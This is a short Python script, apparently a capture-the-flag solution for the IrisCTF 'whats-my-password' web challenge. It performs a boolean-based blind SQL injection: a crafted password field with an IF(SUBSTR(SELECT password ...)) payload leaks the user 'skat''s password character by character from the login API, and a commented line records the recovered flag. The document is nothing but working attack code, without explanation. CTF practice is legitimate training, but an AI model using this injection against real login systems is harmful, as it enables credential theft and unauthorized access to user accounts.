import requests
import string
import json

url="http://whats-my-password-web.chal.irisc.tf/api/login"

#found_char=['i', 'r', 'i', 's', 'c', 't', 'f', '{', 'm', 'y', '_', 'p', '4', '2', '2','W', '0', 'R', 'D', '_', '1', 'S', '_', 'S', 'Q', 'l', '1','}']

found_char=[]

headers={"Content-Type":"application/json"}

def main():
    for x in range(len(found_char),50):
        for i in string.printable[:-6]:
            username = "skat"
            password = f"\" or 1=(IF(SUBSTR((SELECT password from users where username='skat'),{x},1)='{i}', 1,2))-- -"
            data = {"username": username, "password": password}
            sdata=json.dumps(data)

            r=requests.post(url,data=sdata,headers=headers)
            if "root" in r.text:
                found_char.append(i)
                print(found_char)
                break

main()

